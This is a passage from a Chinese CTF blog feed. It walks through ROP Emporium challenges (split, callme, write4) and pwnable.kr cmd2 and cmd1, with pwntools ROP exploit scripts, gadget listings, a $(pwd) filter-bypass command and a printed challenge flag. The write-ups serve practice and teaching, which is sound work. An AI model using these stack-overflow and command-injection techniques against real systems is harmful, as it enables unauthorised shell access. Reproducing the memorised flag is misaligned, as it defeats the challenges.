class="line">addr=0x0804870f off=0x0000070f ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x08048718 off=0x00000718 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...</span><br><span class="line">addr=0x08048744 off=0x00000744 ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048747 off=0x00000747 ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line">addr=0x0804a030 off=0x00001030 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt</span><br><span class="line"></span><br><span class="line">7 strings</span><br></pre></td></tr></table></figure><p>IDA看下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然就是ROP，调用system，传入<code>/bin/cat flag.txt</code>字符串地址了</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./split32'</span>)</span><br><span class="line">p = process(<span class="string">'./split32'</span>)</span><br><span class="line">sys_plt = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(sys_plt)+p32(<span class="number">0xdeadbeaf</span>)+p32(<span class="number">0x0804a030</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>只有一个传参的区别，找一下gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split</span><br><span class="line">[strings]</span><br><span class="line">addr=0x004008a8 off=0x000008a8 ordinal=000 sz=22 section=.rodata string=split by ROP Emporium</span><br><span class="line">addr=0x004008be off=0x000008be ordinal=001 sz=7 section=.rodata string=64bits</span><br><span class="line">addr=0x004008c7 off=0x000008c7 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x004008d0 off=0x000008d0 ordinal=003 sz=44 section=.rodata string=Contriving a reason to ask user for data...</span><br><span class="line">addr=0x004008fc off=0x000008fc ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x004008ff off=0x000008ff ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line">addr=0x00601060 off=0x00001060 ordinal=000 sz=18 section=.data string=/bin/cat flag.txt</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ ROPgadget --binary split --only "pop|ret" | grep "rdi"</span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>IDA看下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./split'</span>)</span><br><span class="line">p = process(<span class="string">'./split'</span>)</span><br><span class="line">sys_plt = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">string_addr = <span class="number">0x601060</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(string_addr)+p64(sys_plt)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="pcallme">callme</span><a href="#pcallme" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ checksec callme32 </span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/callme/callme32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>用IDA查看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hope you read the instructions..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下，应该是构造ROP，分别调用<code>callme_one</code>,<code>callme_two</code>,<code>callme_three</code>，在<code>.so</code>文件中看到都是三个参数，得是1,2,3。所以为了维持栈平衡，需要找pop三次ret的gadget。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme$ ROPgadget --binary callme32 --only 'pop|ret' </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080488ab : pop ebp ; ret</span><br><span class="line">0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048579 : pop ebx ; ret</span><br><span class="line">0x080488aa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080488a9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048562 : ret</span><br><span class="line">0x080486be : ret 0xeac1</span><br></pre></td></tr></table></figure><p>所以找到了gadget地址<code>0x080488a9</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme32'</span>)</span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line">callme_one = elf.symbols[<span class="string">'callme_one'</span>]</span><br><span class="line">callme_two = elf.symbols[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_three = elf.symbols[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_pop_pop_ret = <span class="number">0x080488a9</span> </span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(callme_one)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_two)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(callme_three)+p32(pop_pop_pop_ret)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>同上，只是参数传递不同，三个参数分别用<code>rdi、rsi、rdx</code>传递，所以找gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/callme/callme$ ROPgadget --binary callme --only 'pop|ret' </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b20 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b22 : pop r15 ; ret</span><br><span class="line">0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401900 : pop rbp ; ret</span><br><span class="line">0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</span><br><span class="line">0x0000000000401b23 : pop rdi ; ret</span><br><span class="line">0x0000000000401ab2 : pop rdx ; ret</span><br><span class="line">0x0000000000401b21 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401ab1 : pop rsi ; pop rdx ; ret</span><br><span class="line">0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004017d9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 14</span><br></pre></td></tr></table></figure><p>找到gadget地址<code>0x0000000000401ab0</code><br>构造exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme'</span>)</span><br><span class="line">p = process(<span class="string">'./callme'</span>)</span><br><span class="line">callme_one = elf.symbols[<span class="string">'callme_one'</span>]</span><br><span class="line">callme_two = elf.symbols[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_three = elf.symbols[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_pop_pop_ret = <span class="number">0x401ab0</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_one)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_two)</span><br><span class="line">payload += p64(pop_pop_pop_ret)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(callme_three)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="pwrite4">write4</span><a href="#pwrite4" class="header-anchor">#</a></h2><p>考察任意地址写，举例如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop r1 </span><br><span class="line">pop r2 </span><br><span class="line">ret;（r1存地址，r2存信息）</span><br><span class="line">mov ptr [r1], r2 </span><br><span class="line">ret;（将r2的内容存入r1指向的地址）</span><br></pre></td></tr></table></figure><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ checksec write432</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/write4/write432'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ rabin2 -z write432</span><br><span class="line">[strings]</span><br><span class="line">addr=0x08048700 off=0x00000700 ordinal=000 sz=23 section=.rodata string=write4 by ROP Emporium</span><br><span class="line">addr=0x08048717 off=0x00000717 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x08048720 off=0x00000720 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x08048728 off=0x00000728 ordinal=003 sz=41 section=.rodata string=Go ahead and give me the string already!</span><br><span class="line">addr=0x08048751 off=0x00000751 ordinal=004 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048754 off=0x00000754 ordinal=005 sz=8 section=.rodata string=/bin/ls</span><br><span class="line"></span><br><span class="line">6 strings</span><br></pre></td></tr></table></figure><p>用IDA看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Go ahead and give me the string already!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有system，但是字符串不是我们想要的，如果可以改成调用<code>system('/bin/sh')</code>就好了，所以需要我们自己写入这个字符串。找一下任意地址写的gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/write4$ ROPgadget --binary write432 --only "mov|pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048547 : mov al, byte ptr [0xc9010804] ; ret</span><br><span class="line">0x08048670 : mov dword ptr [edi], ebp ; ret</span><br><span class="line">0x080484b0 : mov ebx, dword ptr [esp] ; ret</span><br><span class="line">0x080486db : pop ebp ; ret</span><br><span class="line">0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080483e1 : pop ebx ; ret</span><br><span class="line">0x080486da : pop edi ; pop ebp ; ret</span><br><span class="line">0x080486d9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804819d : ret</span><br><span class="line">0x080484fe : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 10</span><br></pre></td></tr></table></figure><p>看到地址<code>0x080486da</code>、<code>0x08048670</code>两条gadget满足需求。同时x86系统一次只能写入4个字节，故需要将字符串拆分 成两次分别写入<code>.data</code>段</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os &#x3D; &#39;linux&#39;,arch &#x3D; &#39;i386&#39;, log_level &#x3D; &#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;write432&#39;)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;write432&#39;)</span><br><span class="line">pop_edi_pop_ebp_ret&#x3D;0x080486da</span><br><span class="line">mov_ptredi_ebp_ret&#x3D;0x08048670</span><br><span class="line">data_addr &#x3D; 0x0804a028 </span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28+4)</span><br><span class="line">payload +&#x3D; p32(pop_edi_pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(data_addr)+&#39;&#x2F;bin&#39;</span><br><span class="line">payload +&#x3D; p32(mov_ptredi_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(pop_edi_pop_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(data_addr+4)+&#39;&#x2F;sh\x00&#39;</span><br><span class="line">payload +&#x3D; p32(mov_ptredi_ebp_ret)</span><br><span class="line">payload +&#x3D; p32(elf.symbols[&#39;system&#39;])+p32(0xdeadbeaf)+p32(data_addr)</span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><p>区别在于传参，同时字符串<code>/bin/sh</code>只需要一次就可以完全写入<br>找下gadget</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~&#x2F;rop_emporium_all_challenges&#x2F;write4$ ROPgadget --binary write4 --only &quot;mov|pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x0000000000400821 : mov dword ptr [rsi], edi ; ret</span><br><span class="line">0x00000000004007ae : mov eax, 0 ; pop rbp ; ret</span><br><span class="line">0x0000000000400820 : mov qword ptr [r14], r15 ; ret</span><br><span class="line">0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400890 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400892 : pop r15 ; ret</span><br><span class="line">0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400893 : pop rdi ; ret</span><br><span class="line">0x0000000000400891 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 16</span><br></pre></td></tr></table></figure><p>可以看到<code>0x0000000000400820</code>与<code>0x0000000000400890</code>处的gadget满足要求</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os &#x3D; &#39;linux&#39;,arch &#x3D; &#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;write4&#39;)</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;write4&#39;)</span><br><span class="line">data_addr &#x3D; 0x0000000000601050</span><br><span class="line">pop_r14_pop_r15_ret &#x3D; 0x0000000000400890</span><br><span class="line">mov_ptrr14_r15_ret &#x3D; 0x0000000000400820</span><br><span class="line">pop_rdi_ret &#x3D; 0x0000000000400893</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8)</span><br><span class="line">payload +&#x3D; p64(pop_r14_pop_r15_ret)</span><br><span class="line">payload +&#x3D; p64(data_addr)</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">payload +&#x3D; p64(mov_ptrr14_r15_ret)</span><br><span class="line">payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">payload +&#x3D; p64(data_addr)</span><br><span class="line">payload +&#x3D; p64(elf.symbols[&#39;system&#39;])</span><br><span class="line">p.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>stack_overflow</category>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
        <tag>ROP Emporium</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— cmd2</title>
    <url>/bad1774.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Daddy bought me a system command shell.</span><br><span class="line">but he put some filters to prevent me from playing with it without his permission...</span><br><span class="line">but I wanna play anytime I want!</span><br><span class="line"></span><br><span class="line">ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh cmd2@pwnable.kr -p2222</code>，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcmd2-c">cmd2.c</span><a href="#pcmd2-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>** p;</span><br><span class="line">	<span class="keyword">for</span>(p=environ; *p; p++)	<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	delete_env();</span><br><span class="line">	putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>相对于cmd1，加强了过滤规则，主要是其中<code>/</code>的问题<br>可以在目录下使用<code>pwd</code>构造</p><p>其余的无差</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd2@ubuntu:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'</span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">pwd</span>)bin$(<span class="built_in">pwd</span>)cat $(<span class="built_in">pwd</span>)home$(<span class="built_in">pwd</span>)cmd2$(<span class="built_in">pwd</span>)f*</span></span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>FuN_w1th_5h3ll_v4riabl3s_haha</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— cmd1</title>
    <url>/92a446ce.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy! what is PATH environment in Linux?</span><br><span class="line"></span><br><span class="line">ssh cmd1@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh cmd1@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcmd1">cmd1</span><a href="#pcmd1" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> 